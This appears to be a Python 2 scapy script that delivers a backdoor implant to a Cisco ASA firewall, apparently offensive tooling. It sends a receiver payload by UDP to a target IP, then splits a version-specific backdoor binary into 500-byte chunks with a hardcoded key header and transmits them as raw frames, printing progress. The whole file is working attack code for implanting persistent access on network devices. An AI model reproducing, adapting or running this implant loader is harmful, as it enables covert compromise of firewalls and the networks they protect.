# -*- coding:utf-8 -*-
#!/usr/bin/python

from scapy.all import *
from scapy.layers import *
from ctypes import *
import cPickle
import os
import binascii
import struct
import time


class Proto(Structure):
    _fields_ = [
        ("key", c_char * 50),
        ("finFlag", c_int),
        ("length", c_int),
        ("sequence", c_int)
    ]

def implant_asa_backdoor_ver_1(iface, targetIP, targetVer):
    print "[*] Interface: " + iface
    print "[*] Target IP: " + targetIP
    print "[*] Target Ver: " + targetVer

    try:
        recvCodeFile = open("./backdoor/recv_payload", "r")
        recvCode = recvCodeFile.read()
    except Exception, e:
        print e
        return False

    recvCodePkt = IP(dst=targetIP) / UDP(sport=0, dport=0) / recvCode
    send(recvCodePkt, verbose=False)
    time.sleep(0.5)

    try:
        payloadFile = open("./backdoor/asa_backdoor_" + targetVer, "r")
        payload = payloadFile.read()
    except Exception, e:
        print e
        return False

    sequence = 1
    totalLen = len(payload)
    while payload is not None:
        sectPayload = None
        sendProto = Proto()
        sendProto.key = "`1234567890-="
        sendProto.sequence = sequence
        sequence += 1

        if len(payload) >= 500:
            sectPayload = payload[:500]
            if len(payload) == 500:
                payload = None
            else:
                payload = payload[500:]
            sendProto.length = 500
        else:
            sectPayload = payload[:]
            sendProto.length = len(sectPayload)
            payload = None

        if payload is None:
            sendProto.finFlag = 1
        else:
            sendProto.finFlag = 0

        if len(sectPayload) < 500:
            sectPayload += ''.join(['\x00' for idx in range(0, 500 - len(sectPayload))])

        hexPayload = string_at(addressof(sendProto), sizeof(sendProto)) + sectPayload
        sendPkt = Ether() / IP(dst=targetIP) / UDP(sport=1, dport=1) / hexPayload
        sendp(sendPkt, iface=iface, verbose=False)
        try:
            print "[*] %s%%" % str(int(float((totalLen - len(payload))) / totalLen * 100))
        except:
            print "[*] 100%"

    return True




